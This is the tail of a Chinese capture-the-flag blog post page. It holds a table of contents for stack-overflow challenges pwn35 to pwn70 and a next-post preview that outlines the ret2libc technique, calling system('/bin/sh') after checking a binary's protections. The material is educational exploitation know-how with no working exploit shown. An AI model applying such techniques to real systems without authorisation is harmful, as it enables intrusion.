</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rhea006.github.io">Rhea</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rhea006.github.io/2025/07/5881f3e28f68.html">https://rhea006.github.io/2025/07/5881f3e28f68.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://rhea006.github.io" target="_blank">Rhea's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/w7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/af208b7d2db8.html" title="3-ret2syscall"><img class="cover" src="/img/w6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">3-ret2syscall</div></div><div class="info-2"><div class="info-item-1">ret2libc原理ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。 例1这里我们以 bamboofox 中 ret2libc1 为例。  点击下载: ret2libc1  首先，我们检查一下程序的安全保护： $ chmod +x ret2libc1$ checksec ret2libc1    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes  源程序为 32 位，开启了 NX 保护。下面对程序进行反编译以确定漏洞位置： int __cd...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn35"><span class="toc-number">1.1.</span> <span class="toc-text">pwn35</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36"><span class="toc-number">1.2.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn37"><span class="toc-number">1.3.</span> <span class="toc-text">pwn37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn38"><span class="toc-number">1.4.</span> <span class="toc-text">pwn38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn39"><span class="toc-number">1.5.</span> <span class="toc-text">pwn39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn40"><span class="toc-number">1.6.</span> <span class="toc-text">pwn40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn41"><span class="toc-number">1.7.</span> <span class="toc-text">pwn41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn42"><span class="toc-number">1.8.</span> <span class="toc-text">pwn42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn43"><span class="toc-number">1.9.</span> <span class="toc-text">pwn43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn44"><span class="toc-number">1.10.</span> <span class="toc-text">pwn44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn45"><span class="toc-number">1.11.</span> <span class="toc-text">pwn45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn46"><span class="toc-number">1.12.</span> <span class="toc-text">pwn46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn47"><span class="toc-number">1.13.</span> <span class="toc-text">pwn47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn48"><span class="toc-number">1.14.</span> <span class="toc-text">pwn48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn49"><span class="toc-number">1.15.</span> <span class="toc-text">pwn49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn50"><span class="toc-number">1.16.</span> <span class="toc-text">pwn50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn51"><span class="toc-number">1.17.</span> <span class="toc-text">pwn51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn52"><span class="toc-number">1.18.</span> <span class="toc-text">pwn52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn53"><span class="toc-number">1.19.</span> <span class="toc-text">pwn53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn54"><span class="toc-number">1.20.</span> <span class="toc-text">pwn54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn55"><span class="toc-number">1.21.</span> <span class="toc-text">pwn55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn56"><span class="toc-number">1.22.</span> <span class="toc-text">pwn56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn57"><span class="toc-number">1.23.</span> <span class="toc-text">pwn57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn58"><span class="toc-number">1.24.</span> <span class="toc-text">pwn58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn59"><span class="toc-number">1.25.</span> <span class="toc-text">pwn59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn60"><span class="toc-number">1.26.</span> <span class="toc-text">pwn60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn61"><span class="toc-number">1.27.</span> <span class="toc-text">pwn61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn62"><span class="toc-number">1.28.</span> <span class="toc-text">pwn62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn63"><span class="toc-number">1.29.</span> <span class="toc-text">pwn63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn64"><span class="toc-number">1.30.</span> <span class="toc-text">pwn64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn65"><span class="toc-number">1.31.</span> <span class="toc-text">pwn65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn66"><span class="toc-number">1.32.</span> <span class="toc-text">pwn66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn67%EF%BC%88%E5%A5%BD%E9%9A%BE%EF%BC%8C%E8%89%B0%E9%9A%BE%E7%89%88%EF%BC%89"><span class="toc-number">1.33.</span> <span class="toc-text">pwn67（好难，艰难版）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#nop-sled-%E7%A9%BA%E6%93%8D%E4%BD%9C%E9%9B%AA%E6%A9%87"><span class="toc-number">1.33.0.0.0.1.</span> <span class="toc-text">nop sled 空操作雪橇:</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn68"><span class="toc-number">1.34.</span> <span class="toc-text">pwn68</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn69"><span class="toc-number">1.35.</span> <span class="toc-text">pwn69</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn70"><span class="toc-number">1.36.</span> <span class="toc-text">pwn70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-1"><span class="toc-number">1.37.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-2"><span class="toc-number">1.38.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-3"><span class="toc-number">1.39.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-4"><span class="toc-number">1.40.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-5"><span class="toc-number">1.41.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-6"><span class="toc-number">1.42.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-7"><span class="toc-number">1.43.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-8"><span class="toc-number">1.44.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-9"><span class="toc-number">1.45.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-10"><span class="toc-number">1.46.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-11"><span class="toc-number">1.47.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-12"><span class="toc-number">1.48.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-13"><span class="toc-number">1.49.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-14"><span class="toc-number">1.50.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-15"><span class="toc-number">1.51.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-16"><span class="toc-number">1.52.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-17"><span class="toc-number">1.53.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-18"><span class="toc-number">1.54.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-19"><span class="toc-number">1.55.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-20"><span class="toc-number">1.56.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-21"><span class="toc-number">1.57.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-22"><span class="toc-number">1.58.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-23"><span class="toc-number">1.59.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-24"><span class="toc-number">1.60.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-25"><span class="toc-number">1.61.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-26"><span class="toc-number">1.62.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-27"><span class="toc-number">1.63.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-28"><span class="toc-number">1.64.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn36-29"><span class="toc-number">1.65.</span> <span class="toc-text">pwn36</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/w7.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Rhea</span></div><div class="footer_custom_text">Hi,welocome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'Rhea006/rhea006.github.io',
      'data-repo-id': 'R_kgDOO6e8Gw',
      'data-category-id': 'DIC_kwDOO6e8G84CtK5G',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="search..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>